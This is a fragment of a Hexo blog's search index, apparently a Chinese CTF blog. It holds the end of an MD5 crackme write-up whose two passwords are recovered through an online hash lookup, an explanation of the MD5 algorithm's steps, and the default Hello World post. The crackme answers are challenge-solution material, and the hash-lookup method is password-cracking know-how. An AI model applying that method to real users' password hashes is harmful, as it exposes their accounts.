跟进第二个函数还是hash，看特征码8003，是MD5。但这里遇到一个问题就是它没有规定这六个是什么字符，这要是爆破的话，难度大了许多，但是路见不平绕道而行，我们用别的办法：\n\n思路为在线网站解密hash\n  我们已经知道了hash值，可以考虑直接去在线网站解密，然后直接得出两个密码\n  \n  这样密码就都到手了：\n  密码1：123321\n  密码2：~!3a@0\n  分别输入这两个密码：\n  \n  同一目录下就会出现一个文件：\n  \n  打开就是flag\n\n\n\n","slug":"md5逆向题实例","date":"2022-03-15T02:48:39.000Z","categories_index":"Reverse","tags_index":"WP,算法实例分析","author_index":"Big Devils"},{"id":"0c474fb1f1d514e490492b4c7d30611c","title":"md5算法分析","content":"前言：MD5消息摘要算法(Message Digest Algorithm)，它对输入的任意长度的消息进行运算，产生一个128位的消息摘要。\n算法原理：1.数据填充：对原数据进行消息填充，使其长度取余512余448(448 mod 512)。换句话说就是填充后的数据长度比512的倍数小64位。并且这个数据填充是必做的操作，其实数据正好与448模512同余,也要填充。填充的动作是：附一个1在消息后面，然后用0来填充，直到消息的长度与448模512同余。至少填充1位，至多填充512位。\n2.添加长度：(这里和前面一步又呼应，多的448+64正好512)将上一步的结果附上64位的原数据长度，但如果要填充的原数据长度超过了2^64(本来就只有64字节给它放长度)则用原数据的低64位作为数据填充。(反正到这里得把数据弄到512的整数倍)\n3.初始化变量：用4个变量(A、B、C、D)计算消息摘要，这四个都是大小为32位的寄存器，这些寄存器根据下面的值进行初始化：\nA = 01234567h\nB = 89ABCDEFh\nC = FEDCBA98h\nD = 76543210h\n\nA = 0x67452301h\nB = 0xEFCDAB89h\nC = 0x98BADCFEh\nD = 0x10325476h\n\n4.数据处理：接着将处理后的数据以512位为一组进行运算，首先定义四个辅助函数，每个都是以3个32位双字作为输入，输出1个32位双字。\nF(X,Y,Z)=(X &amp; Y) | ((~X) &amp; Z);\nG(X,Y,Z)=(X &amp; Z) | (Y &amp; (~Z));\nH(X,Y,Z)=X ^ Y ^ Z;\nI(X,Y,Z)=Y ^ (X | (~Z));\n\n","slug":"md5算法分析","date":"2022-03-15T01:45:46.000Z","categories_index":"Crypto","tags_index":"reverse常见算法","author_index":"Big Devils"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-03-14T09:34:34.870Z","categories_index":"","tags_index":"","author_index":"Big Devils"}]